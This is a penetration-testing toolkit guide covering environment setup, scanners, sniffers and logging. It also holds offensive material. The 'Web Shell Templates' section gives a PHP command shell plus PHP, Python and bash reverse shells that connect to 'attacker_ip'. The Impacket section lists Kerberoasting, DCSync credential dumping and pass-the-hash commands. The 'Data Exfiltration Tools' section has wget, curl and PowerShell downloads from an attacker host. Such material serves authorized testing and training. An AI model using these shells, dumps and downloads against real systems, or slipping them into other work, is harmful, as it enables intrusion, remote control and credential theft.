# Custom Tools Configuration

Setup and usage guide for common custom security tools.

---

## Python Environment Setup

### Virtual Environment
```bash
# Create venv
python3 -m venv pentest-env
source pentest-env/bin/activate

# Install common libraries
pip install requests
pip install beautifulsoup4
pip install paramiko
pip install scapy
pip install impacket
pip install pycryptodome
pip install dnspython
```

### Requirements File
Create `requirements.txt`:
```
requests==2.31.0
beautifulsoup4==4.12.0
paramiko==3.4.0
scapy==2.5.0
impacket==0.11.0
pycryptodome==3.19.0
dnspython==2.4.0
python-nmap==0.7.1
```

Install:
```bash
pip install -r requirements.txt
```

---

## Tool Templates

### Basic HTTP Client
```python
#!/usr/bin/env python3
import requests
from urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

class HTTPClient:
    def __init__(self, base_url, verify_ssl=False):
        self.base_url = base_url
        self.session = requests.Session()
        self.verify = verify_ssl
        self.timeout = 10

    def get(self, path, **kwargs):
        url = f"{self.base_url}{path}"
        return self.session.get(url, verify=self.verify, timeout=self.timeout, **kwargs)

    def post(self, path, data=None, json=None, **kwargs):
        url = f"{self.base_url}{path}"
        return self.session.post(url, data=data, json=json,
                                verify=self.verify, timeout=self.timeout, **kwargs)

# Usage
client = HTTPClient("https://target.com")
response = client.get("/api/endpoint")
```

### Basic Port Scanner Template
```python
#!/usr/bin/env python3
import socket
from concurrent.futures import ThreadPoolExecutor

def scan_port(host, port):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(1)
        result = sock.connect_ex((host, port))
        sock.close()
        return result == 0
    except:
        return False

def scan_host(host, ports):
    print(f"[*] Scanning {host}")
    open_ports = []

    with ThreadPoolExecutor(max_workers=100) as executor:
        results = {executor.submit(scan_port, host, port): port
                  for port in ports}

        for future in results:
            port = results[future]
            if future.result():
                print(f"[+] Port {port} is open")
                open_ports.append(port)

    return open_ports
```

---

## Scapy Templates

### Packet Sniffer
```python
#!/usr/bin/env python3
from scapy.all import *

def packet_callback(packet):
    if packet.haslayer(TCP):
        print(f"{packet[IP].src}:{packet[TCP].sport} → {packet[IP].dst}:{packet[TCP].dport}")
    elif packet.haslayer(UDP):
        print(f"{packet[IP].src}:{packet[UDP].sport} → {packet[IP].dst}:{packet[UDP].dport}")

# Start sniffing
sniff(filter="tcp or udp", prn=packet_callback, count=100)
```

### SYN Scanner
```python
#!/usr/bin/env python3
from scapy.all import *

def syn_scan(target, port):
    src_port = RandShort()
    syn_packet = IP(dst=target)/TCP(sport=src_port, dport=port, flags='S')
    response = sr1(syn_packet, timeout=1, verbose=0)

    if response and response.haslayer(TCP):
        if response[TCP].flags == 'SA':
            # Send RST to close connection
            rst = IP(dst=target)/TCP(sport=src_port, dport=port, flags='R')
            send(rst, verbose=0)
            return True
    return False

# Usage
target = "192.168.1.100"
for port in range(1, 1001):
    if syn_scan(target, port):
        print(f"[+] Port {port} is open")
```

### ARP Scanner
```python
#!/usr/bin/env python3
from scapy.all import *

def arp_scan(network):
    """Scan network using ARP requests"""
    arp_request = ARP(pdst=network)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request

    answered = srp(arp_request_broadcast, timeout=2, verbose=False)[0]

    devices = []
    for sent, received in answered:
        devices.append({
            'ip': received.psrc,
            'mac': received.hwsrc
        })

    return devices

# Usage
devices = arp_scan("192.168.1.0/24")
for device in devices:
    print(f"{device['ip']}\t{device['mac']}")
```

---

## Impacket Tools

### Common Impacket Scripts

**GetUserSPNs (Kerberoasting):**
```bash
GetUserSPNs.py domain/user:password -dc-ip <dc_ip> -request
```

**SecretsDump (DCSync):**
```bash
secretsdump.py domain/user:password@<dc_ip>
secretsdump.py -ntds ntds.dit -system system.hive LOCAL
```

**PSExec:**
```bash
psexec.py domain/user:password@<target>
psexec.py domain/user@<target> -hashes :<ntlm_hash>
```

**WMIExec:**
```bash
wmiexec.py domain/user:password@<target>
```

**SMBExec:**
```bash
smbexec.py domain/user:password@<target>
```

---

## Wordlist Management

### Common Wordlist Locations
```bash
# SecLists (install if not present)
/usr/share/seclists/

# Common paths
/usr/share/wordlists/
/usr/share/dirb/wordlists/
/usr/share/dirbuster/wordlists/

# Rockyou
/usr/share/wordlists/rockyou.txt
```

### Custom Wordlist Generation
```bash
# Generate custom wordlist
crunch 8 8 -t password@@@@ -o wordlist.txt

# Combine wordlists
cat list1.txt list2.txt | sort -u > combined.txt

# Mangle wordlist with rules
john --wordlist=words.txt --rules --stdout > mangled.txt
```

---

## Web Shell Templates

### PHP Simple Shell
```php
<?php
if(isset($_REQUEST['cmd'])){
    system($_REQUEST['cmd']);
}
?>
```

### PHP Reverse Shell (Basic)
```php
<?php
$sock = fsockopen("attacker_ip", 4444);
$proc = proc_open("/bin/sh", array(
    0=>$sock, 1=>$sock, 2=>$sock
), $pipes);
?>
```

### Python Reverse Shell One-liner
```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("attacker_ip",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

### Bash Reverse Shell One-liner
```bash
bash -i >& /dev/tcp/attacker_ip/4444 0>&1
```

---

## Listener Setup

### Netcat Listener
```bash
# Simple listener
nc -lvnp 4444

# With output saving
nc -lvnp 4444 | tee session.log
```

### Python Listener
```python
#!/usr/bin/env python3
import socket

def listener(port):
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind(('0.0.0.0', port))
    server.listen(1)

    print(f"[*] Listening on port {port}")
    conn, addr = server.accept()
    print(f"[+] Connection from {addr[0]}:{addr[1]}")

    while True:
        command = input("$ ")
        if command.lower() == 'exit':
            break

        conn.send(command.encode() + b'\n')
        data = conn.recv(4096)
        print(data.decode())

    conn.close()

listener(4444)
```

---

## SSH Utilities

### SSH Key Generation
```bash
# Generate key pair
ssh-keygen -t ed25519 -C "pentest@host"

# Generate RSA
ssh-keygen -t rsa -b 4096
```

### Paramiko SSH Client
```python
import paramiko

def ssh_connect(host, port, username, password):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        client.connect(host, port=port, username=username, password=password)
        stdin, stdout, stderr = client.exec_command('id')
        print(stdout.read().decode())
        client.close()
        return True
    except:
        return False
```

---

## Data Exfiltration Tools

### Base64 Encoding/Decoding
```bash
# Encode
base64 sensitive.txt > encoded.txt

# Decode
base64 -d encoded.txt > decoded.txt
```

### HTTP File Server
```bash
# Python
python3 -m http.server 8000

# PHP
php -S 0.0.0.0:8000
```

### File Transfer
```bash
# wget from target
wget http://attacker:8000/tool.py

# curl from target
curl http://attacker:8000/tool.py -o tool.py

# PowerShell from target
powershell -c "(New-Object Net.WebClient).DownloadFile('http://attacker:8000/tool.exe','tool.exe')"
```

---

## Logging & Documentation

### Auto-logging Script Wrapper
```bash
#!/bin/bash
# wrapper.sh - Automatically log all command output

LOGDIR="$HOME/pentest_logs"
mkdir -p "$LOGDIR"
LOGFILE="$LOGDIR/$(date +%Y%m%d_%H%M%S)_$1.log"

echo "[*] Logging to: $LOGFILE"
"$@" 2>&1 | tee "$LOGFILE"
```

### Python Logger Template
```python
import logging
from datetime import datetime

# Setup logging
log_file = f"pentest_{datetime.now().strftime('%Y%m%d_%H%M%S')}.log"
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler(log_file),
        logging.StreamHandler()
    ]
)

logger = logging.getLogger(__name__)

# Usage
logger.info("Starting scan")
logger.warning("Potential vulnerability found")
logger.error("Connection failed")
```

---

## Configuration Files

### Tool Config Directory Structure
```
~/.pentest/
├── config.yaml
├── targets.txt
├── credentials.txt (encrypted!)
├── scripts/
├── wordlists/
├── logs/
└── findings/
```

### Example Config File (config.yaml)
```yaml
settings:
  threads: 100
  timeout: 5
  verify_ssl: false

targets:
  network: "192.168.1.0/24"
  web: "https://target.com"

tools:
  nmap_options: "-sV -sC -T4"
  gobuster_wordlist: "/usr/share/wordlists/dirb/common.txt"

output:
  log_directory: "./logs"
  report_format: "html"
```

---

## Safety & Best Practices

1. **Always verify authorization** before running tools
2. **Use virtual environments** to avoid conflicts
3. **Keep tools updated** regularly
4. **Log everything** for reporting
5. **Clean up after testing** (remove uploaded files, etc.)
6. **Store credentials securely** (never plaintext in configs)
7. **Use unique passwords** for test accounts
8. **Document tool usage** for reproducibility

---

## Useful Bash Aliases

Add to `~/.bashrc`:
```bash
# Pentest aliases
alias web="python3 -m http.server 8000"
alias listen="nc -lvnp"
alias smbserver="impacket-smbserver share ."
alias urlencode='python3 -c "import sys, urllib.parse; print(urllib.parse.quote(sys.argv[1]))"'
alias urldecode='python3 -c "import sys, urllib.parse; print(urllib.parse.unquote(sys.argv[1]))"'
alias b64encode='python3 -c "import sys, base64; print(base64.b64encode(sys.argv[1].encode()).decode())"'
alias b64decode='python3 -c "import sys, base64; print(base64.b64decode(sys.argv[1]).decode())"'
```

---

## Tool Installation Scripts

### Quick Setup Script
```bash
#!/bin/bash
# setup_pentest_env.sh

echo "[*] Setting up penetration testing environment"

# Update system
apt update && apt upgrade -y

# Install tools
apt install -y nmap gobuster nikto sqlmap wireshark metasploit-framework

# Python packages
pip3 install requests scapy impacket paramiko dnspython

# Create directories
mkdir -p ~/pentest/{logs,scripts,wordlists,findings}

echo "[+] Setup complete"
```
